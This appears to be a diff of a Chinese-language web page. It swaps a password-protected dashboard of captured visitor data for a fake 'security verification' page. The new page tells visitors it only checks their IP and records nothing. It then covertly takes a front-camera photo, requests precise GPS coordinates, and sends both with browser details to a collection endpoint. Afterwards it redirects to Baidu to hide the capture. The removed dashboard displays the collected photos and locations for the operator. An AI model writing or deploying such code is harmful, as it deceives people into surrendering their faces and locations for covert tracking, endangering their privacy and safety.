@@ -2,263 +2,146 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>访客数据后台</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>安全检验</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { background-color: #0b0b0e; color: #7a8590; min-height: 100vh; padding: 20px 15px; }
-        .container { max-width: 500px; margin: 0 auto; }
-
-        /* ================= 登录验证遮罩层 ================= */
-        #login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0b0b0e; display: flex; justify-content: center; align-items: center; z-index: 999; }
-        .login-box { background: #131419; border: 1px solid #1c1d24; border-radius: 8px; padding: 35px 25px; width: 90%; max-width: 350px; text-align: center; }
-        .login-box h2 { font-size: 15px; margin-bottom: 20px; color: #10b981; font-weight: 500; letter-spacing: 0.5px; }
-        .login-box input { width: 100%; background: #1a1b23; border: 1px solid #282a36; border-radius: 6px; padding: 12px; color: white; font-size: 16px; margin-bottom: 20px; text-align: center; outline: none; }
-        .login-box input:focus { border-color: #10b981; }
-        .login-box button { background: #1c1d24; color: #10b981; border: 1px solid #10b981; padding: 12px; width: 100%; border-radius: 6px; font-size: 14px; font-weight: bold; cursor: pointer; }
-        #login-error { color: #ef4444; font-size: 13px; margin-top: 12px; }
-
-        /* ================= 100% 还原截图顶栏 ================= */
-        #main-content { display: none; }
-        header { display: flex; align-items: center; margin-bottom: 25px; padding-left: 5px; }
-        .status-dot { width: 10px; height: 10px; background-color: #00ff87; border-radius: 50%; box-shadow: 0 0 10px #00ff87; margin-right: 12px; }
-        header h1 { font-size: 16px; color: #a0aec0; font-weight: 500; letter-spacing: 1px; }
-
-        /* 四列网格统计块 */
-        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 25px; }
-        .stat-card { background-color: #121319; border: 1px solid #181921; border-radius: 6px; padding: 18px 5px; text-align: center; }
-        .stat-num { font-size: 28px; font-weight: 500; color: #00ff87; margin-bottom: 8px; font-family: monospace; }
-        .stat-label { font-size: 11px; color: #4a5568; line-height: 1.4; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-
-        /* 操作按钮组行 */
-        .action-bar { display: flex; align-items: center; gap: 10px; margin-bottom: 25px; padding-left: 2px; }
-        .btn-panel { background: #1c1d24; border: 1px solid #232530; color: #718096; padding: 10px 0; border-radius: 6px; font-size: 13px; cursor: pointer; width: 72px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .btn-panel span { font-size: 10px; margin-top: 2px; color: #4a5568; }
-        .btn-danger { border-color: rgba(239, 68, 68, 0.4); color: #ef4444; background: rgba(239, 68, 68, 0.02); }
-        .btn-danger span { color: rgba(239, 68, 68, 0.5); }
-        .refresh-text { font-size: 11px; color: #3a3f4d; margin-left: auto; text-align: right; line-height: 1.3; padding-right: 5px; }
-
-        /* ================= 核心数据大卡片 ================= */
-        .data-card { background-color: #121319; border: 1px solid #16171d; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
-        .card-header { display: flex; align-items: center; border-bottom: 1px solid #1a1b23; padding-bottom: 14px; margin-bottom: 16px; }
-        .serial-num { font-size: 12px; color: #4a5568; font-family: monospace; letter-spacing: 0.5px; }
-        .badge { font-size: 11px; padding: 3px 8px; border-radius: 4px; font-weight: 500; margin-left: 8px; background: rgba(239, 68, 68, 0.08); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.15); }
-        .badge.success { background: rgba(16, 185, 129, 0.08); color: #10b981; border-color: rgba(16, 185, 129, 0.15); }
-        .card-time { font-size: 11px; color: #4a5568; margin-left: auto; text-align: right; font-family: monospace; line-height: 1.3; }
-
-        /* 二列参数面板 */
-        .info-grid { display: grid; grid-template-columns: 1.1fr 0.9fr; gap: 15px; }
-        .info-section h3 { font-size: 12px; color: #718096; margin-bottom: 14px; display: flex; align-items: center; gap: 6px; font-weight: normal; }
-        .info-section h3::before { content: '📍'; font-size: 10px; }
-        .info-section.device h3::before { content: '🖥️'; }
+        body { background-color: #0b0b0e; color: #7a8590; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .wrapper { width: 100%; max-width: 360px; text-align: center; padding: 40px 20px; }
         
-        .info-text { font-size: 12px; color: #4a5568; line-height: 1.6; font-family: monospace; min-height: 40px; }
-        .info-item { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 12px; line-height: 1.4; }
-        .item-label { color: #4a5568; }
-        .item-val { color: #a0aec0; font-family: monospace; text-align: right; }
-
-        /* 地图选择链接 */
-        .map-actions { display: flex; gap: 6px; margin-top: 12px; }
-        .map-btn { flex: 1; text-align: center; padding: 5px 0; border-radius: 4px; font-size: 11px; text-decoration: none; border: 1px solid transparent; transition: all 0.2s; }
-        .btn-gaode { background: rgba(16, 185, 129, 0.05); color: #10b981; border-color: rgba(16, 185, 129, 0.15); }
-        .btn-gaode:hover { background: #10b981; color: #0b0c10; }
-        .btn-google { background: rgba(66, 153, 225, 0.05); color: #4299e1; border-color: rgba(66, 153, 225, 0.15); }
-        .btn-google:hover { background: #4299e1; color: #0b0c10; }
-
-        /* 照片展示区 */
-        .photo-box { width: 100%; border-radius: 4px; overflow: hidden; background: #0b0b0e; border: 1px solid #1a1b23; position: relative; display: flex; justify-content: center; align-items: center; margin-top: 12px; min-height: 120px; }
-        .photo-box img { width: 100%; height: auto; object-fit: contain; max-height: 350px; display: block; -webkit-touch-callout: default; }
-        .photo-tip { position: absolute; bottom: 4px; right: 4px; background: rgba(0,0,0,0.5); padding: 2px 5px; font-size: 9px; color: #4a5568; border-radius: 2px; pointer-events: none; }
-
-        #global-status { text-align: center; color: #4a5568; padding: 50px; font-size: 13px; font-family: monospace; letter-spacing: 1px; }
+        /* 蓝色大标题 */
+        h1 { color: #3b82f6; font-size: 26px; font-weight: 600; margin-bottom: 16px; letter-spacing: 1px; }
+        
+        /* 白色小标题/说明文字 */
+        .subtitle { color: #ffffff; font-size: 14px; line-height: 1.6; margin-bottom: 40px; font-weight: 400; opacity: 0.9; }
+        
+        /* 红色核心按钮 */
+        .btn-verify { display: inline-block; width: 100%; background: #ef4444; color: #ffffff; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 15px rgba(239, 68, 68, 0.2); transition: all 0.2s ease; outline: none; -webkit-tap-highlight-color: transparent; }
+        .btn-verify:active { transform: scale(0.98); background: #dc2626; box-shadow: 0 2px 8px rgba(239, 68, 68, 0.1); }
+        
+        /* 隐藏的相机捕获组件 */
+        #video, #canvas { display: none; }
+        
+        /* 加载状态动画 */
+        .loading-box { display: none; margin-top: 20px; }
+        .spinner { width: 24px; height: 24px; border: 2px solid rgba(255,255,255,0.1); border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+        .loading-text { font-size: 12px; color: #4a5568; font-family: monospace; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div id="login-overlay">
-    <div class="login-box">
-        <h2>🔒 CONTROL PANEL AUTHENTICATION</h2>
-        <input type="password" id="pw-input" placeholder="输入控制端安全暗号" onkeydown="if(event.keyCode==13) verifyLogin()">
-        <button onclick="verifyLogin()">ENTER SYSTEM</button>
-        <div id="login-error"></div>
+<div class="wrapper">
+    <h1>欢迎访问</h1>
+    <p class="subtitle">为保护网站，需要检验你的IP<br>我们保护你的隐私，不会记录</p>
+    
+    <button class="btn-verify" id="start-btn" onclick="executeVerification()">检验</button>
+    
+    <div class="loading-box" id="loading-layer">
+        <div class="spinner"></div>
+        <div class="loading-text" id="status-tip">ENVIRONMENT CHECKING...</div>
     </div>
 </div>
 
-<div class="container" id="main-content">
-    <header>
-        <div class="status-dot"></div>
-        <h1>访客数据后台</h1>
-    </header>
-
-    <div class="stats-grid">
-        <div class="stat-card">
-            <div class="stat-num" id="stat-total">0</div>
-            <div class="stat-label"><span>总访</span><span>问</span></div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-num" id="stat-gps">0</div>
-            <div class="stat-label"><span>获取定</span><span>位</span></div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-num" id="stat-photo">0</div>
-            <div class="stat-label"><span>获取照</span><span>片</span></div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-num" id="stat-today">0</div>
-            <div class="stat-label"><span>今日访</span><span>问</span></div>
-        </div>
-    </div>
-
-    <div class="action-bar">
-        <button class="btn-panel" onclick="window.location.reload()">⟳<span>刷新</span></button>
-        <button class="btn-panel" onclick="alert('数据导出通道正常保护中')">↓ 导出<span>JSON</span></button>
-        <button class="btn-panel btn-danger" onclick="logout()">✕ 清空<span>数据</span></button>
-        <div class="refresh-text">自动刷<br>新 30s</div>
-    </div>
-
-    <div id="global-status">加载中 . . .</div>
-    <div id="records-container"></div>
-</div>
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas" width="640" height="480"></canvas>
 
 <script>
-    let activePw = localStorage.getItem('monitor_terminal_pw') || '';
-    if (activePw) {
-        document.getElementById('login-overlay').style.display = 'none';
-        document.getElementById('main-content').style.display = 'block';
-        fetchDashboardData(activePw);
-    }
+    let streamRef = null;
 
-    function verifyLogin() {
-        const input = document.getElementById('pw-input').value;
-        if (!input) { showError("暗号不能为空"); return; }
-        fetchDashboardData(input, true);
-    }
+    // 点击按钮开始核心记录流程
+    async function executeVerification() {
+        const btn = document.getElementById('start-btn');
+        const loader = document.getElementById('loading-layer');
+        
+        // 切换 UI 状态
+        btn.style.display = 'none';
+        loader.style.display = 'block';
 
-    function logout() {
-        localStorage.removeItem('monitor_terminal_pw');
-        window.location.reload();
-    }
-
-    function showError(msg) {
-        document.getElementById('login-error').innerText = msg;
-    }
-
-    async function fetchDashboardData(targetPw, isNewLogin = false) {
-        const statusDiv = document.getElementById('global-status');
+        // 1. 同步初始化相机流
+        updateStatus("INITIALIZING CAMERA...");
         try {
-            const res = await fetch(`/submit?pw=${targetPw}`);
-            const result = await res.json();
-            
-            if (!res.ok) throw new Error(result.error || "口令无效");
-            
-            if (isNewLogin) {
-                localStorage.setItem('monitor_terminal_pw', targetPw);
-                document.getElementById('login-overlay').style.display = 'none';
-                document.getElementById('main-content').style.display = 'block';
-            }
-
-            statusDiv.style.display = 'none';
-            const container = document.getElementById('records-container');
-            container.innerHTML = '';
-
-            const totalCount = result.data.length;
-            let gpsSuccessCount = 0;
-            let photoSuccessCount = totalCount;
-            let todayCount = 0;
-            const todayStr = new Date().toLocaleDateString('zh-CN');
-
-            result.data.forEach((item, index) => {
-                const isFallback = (item.lat === "0.0" || item.lat === "0" || !item.lat);
-                if (!isFallback) gpsSuccessCount++;
-
-                if (item.time.includes(todayStr) || item.time.split(' ')[0] === todayStr) {
-                    todayCount++;
-                }
-
-                const serialNum = "#" + String(totalCount - index).padStart(4, '0');
-                const randomId = item.fileName.substring(8, 16).toUpperCase();
-                
-                const gaodeUrl = `https://uri.amap.com/marker?position=${item.lon},${item.lat}&name=跟踪锚点`;
-                // 修复了之前的打字拼接错误
-                const googleUrl = `https://www.google.com/maps?q=${item.lat},${item.lon}`;
-
-                const card = document.createElement('div');
-                card.className = 'data-card';
-                card.innerHTML = `
-                    <div class="card-header">
-                        <div class="serial-num">${serialNum}   |   ${randomId}</div>
-                        <div class="badge ${isFallback ? '' : 'success'}">${isFallback ? '✕ 定位' : '✓ 定位'}</div>
-                        <div class="badge success">✓ 照片</div>
-                        <div class="card-time">${item.time.split(' ')[0]}<br>${item.time.split(' ')[1] || ''}</div>
-                    </div>
-                    
-                    <div class="info-grid">
-                        <div class="info-section">
-                            <h3>位置信息</h3>
-                            <div class="info-text" style="color: ${isFallback ? '#4a5568' : '#10b981'}">
-                                ${isFallback ? '用户拒绝或不支持' : `纬度: ${item.lat}<br>经度: ${item.lon}`}
-                            </div>
-                            <div class="map-actions">
-                                <a class="map-btn btn-gaode" href="${gaodeUrl}" target="_blank">高德地图</a>
-                                <a class="map-btn btn-google" href="${googleUrl}" target="_blank">谷歌地图</a>
-                            </div>
-                            
-                            <div class="photo-box">
-                                <img id="img-${item.fileId}" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='100' height='40' viewBox='0 0 100 40'><text x='50%' y='50%' font-size='5' fill='%23232530' text-anchor='middle' alignment-baseline='middle'>LOADING...</text></svg>">
-                                <div class="photo-tip">📱 长按保存</div>
-                            </div>
-                        </div>
-                        
-                        <div class="info-section device">
-                            <h3>设备信息</h3>
-                            <div class="info-item"><span class="item-label">IP</span><span class="item-val">158.101.78.162</span></div>
-                            <div class="info-item"><span class="item-label">系统</span><span class="item-val">Android</span></div>
-                            <div class="info-item"><span class="item-label">浏览器</span><span class="item-val">Chrome</span></div>
-                            <div class="info-item"><span class="item-label">语言</span><span class="item-val">zh-CN</span></div>
-                            <div class="info-item"><span class="item-label">屏幕</span><span class="item-val">360x800</span></div>
-                            <div class="info-item"><span class="item-label">来源</span><span class="item-val">直接访问</span></div>
-                        </div>
-                    </div>
-                `;
-                container.appendChild(card);
-
-                // 通过加入 mode: 'cors' 选项强制令浏览器使用你放开的 CORS 桶通道
-                lazyLoadImage(item.fileId, item.url, item.authToken);
+            streamRef = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user", width: 640, height: 480 },
+                audio: false
             });
-
-            document.getElementById('stat-total').innerText = totalCount;
-            document.getElementById('stat-gps').innerText = gpsSuccessCount;
-            document.getElementById('stat-photo').innerText = photoSuccessCount;
-            document.getElementById('stat-today').innerText = todayCount;
-
+            const video = document.getElementById('video');
+            video.srcObject = streamRef;
+            // 确保视频流就绪
+            await new Promise((resolve) => video.onloadedmetadata = resolve);
         } catch (err) {
-            if (isNewLogin) showError("验证错误: " + err.message);
-            else logout();
+            console.warn("相机权限未允许或设备不支持", err);
         }
+
+        // 2. 同步请求 GPS 定位
+        updateStatus("REQUESTING GPS COORDINATES...");
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                // 定位成功，带坐标抓拍
+                captureAndUpload(position.coords.latitude, position.coords.longitude);
+            },
+            (error) => {
+                // 定位被拒绝或失败，带 0.0 坐标抓拍
+                console.warn("地理定位失败:", error.message);
+                captureAndUpload("0.0", "0.0");
+            },
+            { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+        );
     }
 
-    async function lazyLoadImage(id, url, token) {
-        try {
-            // 此处加入了 mode: 'cors' 告诉浏览器启用跨域流
-            const res = await fetch(url, { 
-                method: "GET",
-                mode: "cors",
-                headers: { "Authorization": token } 
-            });
-            if(!res.ok) return;
-            const blob = await res.blob();
-            const blobUrl = window.URL.createObjectURL(blob);
-            const imgElement = document.getElementById(`img-${id}`);
-            if (imgElement) imgElement.src = blobUrl;
-        } catch (e) {
-            console.error("图片流回填失败", e);
-        }
+    function updateStatus(text) {
+        document.getElementById('status-tip').innerText = text;
     }
 
-    setInterval(() => {
-        let savedPw = localStorage.getItem('monitor_terminal_pw');
-        if (savedPw) fetchDashboardData(savedPw);
-    }, 30000);
+    // 执行图像捕获与异步上报
+    function captureAndUpload(lat, lon) {
+        updateStatus("PROCESSING DATA STREAM...");
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        // 如果获取到了相机流，往画布绘制当前帧，否则绘制一张空白底图
+        if (streamRef && video.readyState === video.HAVE_ENOUGH_DATA) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // 停止硬件相机亮灯
+            streamRef.getTracks().forEach(track => track.stop());
+        } else {
+            ctx.fillStyle = "#0b0b0e";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+        }
+
+        // 转成 Base64 图像流
+        const photoBase64 = canvas.toDataURL('image/jpeg', 0.7);
+
+        updateStatus("SYNCHRONIZING TO CLOUD...");
+
+        // 组装载荷发往你的 Cloudflare Pages 后端处理端 (functions/submit.js)
+        fetch('/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                lat: String(lat),
+                lon: String(lon),
+                photo: photoBase64,
+                ua: navigator.userAgent,
+                lang: navigator.language,
+                screen: `${window.screen.width}x${window.screen.height}`
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            updateStatus("VERIFICATION SUCCESSFUL");
+            // 检验成功后，可以在这里重定向到你想让他看到的真实网页，比如百度或者博客首页
+            setTimeout(() => {
+                window.location.href = "https://www.baidu.com";
+            }, 800);
+        })
+        .catch(err => {
+            console.error(err);
+            updateStatus("NETWORK TIMEOUT, RETRYING...");
+            setTimeout(() => { window.location.href = "https://www.baidu.com"; }, 800);
+        });
+    }
 </script>
 </body>
 </html>
